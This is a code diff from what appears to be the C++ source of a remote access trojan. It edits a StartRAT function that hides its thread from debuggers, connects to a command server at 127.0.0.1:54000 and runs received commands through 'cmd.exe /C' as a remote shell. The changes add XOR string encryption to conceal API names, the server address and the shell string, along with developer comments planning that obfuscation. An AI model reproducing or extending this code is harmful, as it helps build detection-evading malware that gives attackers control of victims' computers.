@@ -19,20 +19,37 @@ typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
-	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
-	resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+	// consider using a single key, using multiple keys adds additional overhead (and huge performance downside), which is not a priority right now..	
+	// here's one idea: generate one global key (in string_encryption.h), and use it. 
+	// where you think it is better having a unique key, generate a new one in the specific context
+	// with the global key: use a macro that returns the string after reencrypted and decrypted with the global key. after, we can always call the funcs manually if needed to reencrypt for example (or just reencrypt again with a new key, idk, doesn't matter.)
+	// with the unique key: use an inline function (or macro possibly?) that gets the key generated, the string literal, reencrypts the string and returns the decrypted string
+	// basically when using the macro or the inline function - we always reencrypt. then we perform the steps (e.g reencrypting afterwards or wiping the strings value) as we wish.
+
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_encrypt("GetCurrentThread").c_str());
+	resolve_dynamically<NtSetInformationThread_t>(string_encrypt("NtSetInformationThread").c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	suspicious_junk_3();
 
-	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
+	auto arr = compile_time_encrypt("127.0.0.1");
+	auto key = generate_runtime_key();
+	runtime_reencryption(arr.data(), arr.size(), key);
+	std::string ip = xor_transform(arr.data(), arr.size(), key);
+
+	TCPClient* conn = new TCPClient(string_encrypt("127.0.0.1"), 54000);
+
 	conn->start_connection();
+
+	auto cmdStringArr = compile_time_encrypt("cmd.exe /C ");
+	key = generate_runtime_key();
+	runtime_reencryption(cmdStringArr.data(), cmdStringArr.size(), key);
 
 	while (true)
 	{
 		// recv command from server
-		std::string commandLine = "cmd.exe /C ";
+		std::string commandLine = xor_transform(cmdStringArr.data(), cmdStringArr.size(), key);
 
-		suspicious_junk_1(); 
+		suspicious_junk_1();
 
 		commandLine.append(conn->recv_data());
 
